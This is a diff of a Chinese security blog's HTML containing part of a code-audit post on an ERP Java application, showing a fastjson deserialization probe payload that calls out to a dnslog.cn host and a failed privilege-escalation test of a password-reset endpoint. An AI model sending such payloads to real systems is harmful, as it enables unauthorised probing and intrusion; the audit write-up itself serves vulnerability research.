    &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以在<code>UserComponent</code>里找到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       String search = map.get(Constants.SEARCH);</span><br><span class="line">       String userName = StringUtil.getInfo(search, <span class="string">&quot;userName&quot;</span>);</span><br><span class="line">       String loginName = StringUtil.getInfo(search, <span class="string">&quot;loginName&quot;</span>);</span><br><span class="line">       String order = QueryUtils.order(map);</span><br><span class="line">       String filter = QueryUtils.filter(map);</span><br><span class="line">       <span class="keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候可以用1.2.55的payload测试一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;x4ht4h.dnslog.cn&quot;</span>&#125;&amp;currentPage=<span class="number">1</span>&amp;pageSize=<span class="number">15</span></span><br><span class="line">HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808160343301.png" alt="image-20220808160343301"></p>
+<p>dnslog收到请求。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808160326771.png" alt="image-20220808160326771"></p>
+<h2 id="失败的越权"><a href="#失败的越权" class="headerlink" title="失败的越权"></a>失败的越权</h2><p>越权漏洞审计的思路：</p>
+<ol>
+<li>需要熟悉主要的功能模块。</li>
+<li>需要确定系统所使用的权限控制技术，例如springsecurity，shiro以及手动编写的filter过滤器。</li>
+</ol>
+<p>越权漏洞主要分为两个维度，一个是接口授权的问题，另一个是数据鉴权的问题。</p>
+<p>通过合理的权限控制技术来动态的将所有的用户和角色绑定起来，将所有的角色和权限绑定以来，来解决接口授权不到位的问题。</p>
+<p>通过分析实际的功能和业务需求，在具体的业务方法里面进行数据鉴权，最终落地到sql查询条件的限制以及角色的控制。</p>
+<p>在重置密码功能中有以下功能：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/resetPwd&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">resetPwd</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> Long id,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       Map&lt;String, Object&gt; objectMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">       String password = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">       String md5Pwd = Tools.md5Encryp(password);</span><br><span class="line">       <span class="keyword">int</span> update = userService.resetPwd(md5Pwd, id);</span><br><span class="line">       <span class="keyword">if</span>(update &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.OK.code);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会默认把密码设置为123456。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">resetPwd</span><span class="params">(String md5Pwd, Long id)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">     <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">     logService.insertLog(<span class="string">&quot;用户&quot;</span>,</span><br><span class="line">             <span class="keyword">new</span> StringBuffer(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(id).toString(),</span><br><span class="line">             ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());</span><br><span class="line">     User u = getUser(id);</span><br><span class="line">     String loginName = u.getLoginName();</span><br><span class="line">     <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(loginName))&#123;</span><br><span class="line">         logger.info(<span class="string">&quot;禁止重置超管密码&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         User user = <span class="keyword">new</span> User();</span><br><span class="line">         user.setId(id);</span><br><span class="line">         user.setPassword(md5Pwd);</span><br><span class="line">         <span class="keyword">try</span>&#123;</span><br><span class="line">             result=userMapper.updateByPrimaryKeySelective(user);</span><br><span class="line">         &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">             JshException.writeFail(logger, e);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中只对admin进行了鉴权，使其不能重置超管密码，但是对其他用户都可以使用更改。接下来以为这是一个轻而易举的越权漏洞，但是在测试的时候发现同角色的用户修改他人密码不成功的情况。这是因为在执行sql语句的时候会多一句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;include refid=&quot;Base_Column_List&quot; /&gt;</span><br><span class="line">from jsh_unit</span><br><span class="line">where id = #&#123;id,jdbcType=BIGINT&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法会拼接一个条件jsh_user.tenant_id=xxx。后经查询知道该字段是mybatisplus自动为防止越权漏洞设置的技术。因此未设置越权。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33776323/article/details/123420374">(147条消息) Mybatis-plus如何实现自动添加租户ID，Insert操作时怎么自动添加tenant_id字段_jianghx1024的博客-CSDN博客_mybatis tenant</a></p>
+
       
 
       
@@ -893,7 +269,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java代码审计</a>
         		</li>
       		
 		</ul>
@@ -902,16 +278,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2022/08/09/%E8%8B%A5%E4%BE%9DCMS%E5%AE%A1%E8%AE%A1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          若依CMS审计
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/29/ofcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ofcms代码审计</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -931,88 +375,14 @@
 
 
 
-
-  
-    <article id="post-Kerberos协议" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/">Kerberos协议</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-  	<time datetime="2022-02-27T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h1><p>Kerberos是诞生于上个世纪90年代的计算机认证协议，被广泛应用于各大操作系统和Hadoop生态系统中。了解Kerberos认证的流程将有助于结局Hadoop集群中的安全配置过程中的问题。</p>
-        
-          <a class="article-more-a" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1035,8 +405,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
